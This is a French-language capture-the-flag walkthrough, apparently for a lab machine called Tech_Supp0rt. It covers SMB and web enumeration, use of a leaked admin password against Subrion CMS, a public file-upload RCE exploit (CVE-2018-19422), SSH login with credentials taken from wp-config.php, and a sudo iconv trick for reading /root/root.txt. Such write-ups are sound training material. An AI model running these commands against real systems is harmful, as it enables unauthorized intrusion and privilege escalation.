- **IP**:
```
10.10.251.7
```

- **nmap**
![[Tech-SuppOrt/file/nmap.png]]

- Accéder au port 80:
![[Tech-SuppOrt/file/web.png]]

- **gobuster** pour l'énumération des directories:
```
gobuster dir -u http://10.10.251.7/ -w raft-small-words.txt -x php,txt,html -t 30
```

![[gobuster.png]]

- Accéder à **/wordpress**:
![[worpress.png]]

- Accéder à **/test**:
![[test.png]]

- Dans le nmap, nous avons trouvé un port smb ouvert. Pour tester si le smb n'a pas besoin d'authentification, nous allons utiliser **Crackmapexec**:
```
crackmapexec smb 10.10.251.7 -u guest -p ** --shares
```
![[crackmapexec.png]]

- On voit un client smb: **websvr** qui a la permission: **READ**. On va s'y connecter:
```
smbclient -N //10.10.251.7/websvr
```

![[smbclient.png]]

- Comme le port **139** est ouvert, nous allons utilisé **enum4linux** pour dump la liste des utilisateurs dans le serveur:
```
enum4linux -a 10.10.251.7
```

- Nous allons laisser tourner ça en arrière plan et revenir sur le fichier qu'on vient de download: `cat enter.txt`
![[enter.png]]

- Quand on essaye d'accéder à **/subrio**, on a une erreur. On va utiliser **burpsuite** pour voir exactement ce qui se passe. D'après le résultat, l'adresse de redirection est invalide mais quand j'essaye d'accéder à un fichier dont je sais que ça existe, la réponse est **200 OK**.
![[burp.png]]

- On va accéder maintenant à **/subrion/robots.txt**
![[robots.png]]

- Miantenant **/panel**:
![[panel.png]]

- Rappelons nous qu'on a trouvé un credential dans le fichier enter.txt, nous allons le décrypter avec **cyberchef** parce que c'est peut être un mdp:
![[Tech-SuppOrt/file/cyberchef.png]]

- Avec les logins **admin:Scam2021** on accès aux dashbord admin:

![[dashbord.png]]

- La version **Subrion CMS v4.2.1** est vulnérable à **File Upload Bypass to RCE - CVE-2018-19422**. Nous allons donc utiliser ce CVE:
```
python3 49876.py -u http://10.10.251.7/subrion/panel/ -l admin -p Scam2021
```

![[CVE.png]]

![[home.png]]

Là on découvre l'user **scamsite**

- Maintenant on va chercher un **configfile**
![[configfile.png]]

- On a trouvé le fichier **wp-config.php** donc on va l'afficher
![[configphp.png]]

- Là on a trouvé un mdp donc on va se connecter via ssh 
```
scamsite:ImAScammerLOL!123!
```
![[Tech-SuppOrt/file/ssh.png]]

- Il faut maintenant chercher ce qu'on peut exécuter avec les droits **sudo**
![[sudo.png]]

- Il faut faire une recherche sur `/usr/bin/inconv`
![[iconv.png]]

- Il ne reste plus qu'à taper la commande:
```
sudo -u root iconv -f 8859_1 -t 8859_1 "/root/root.txt"
```

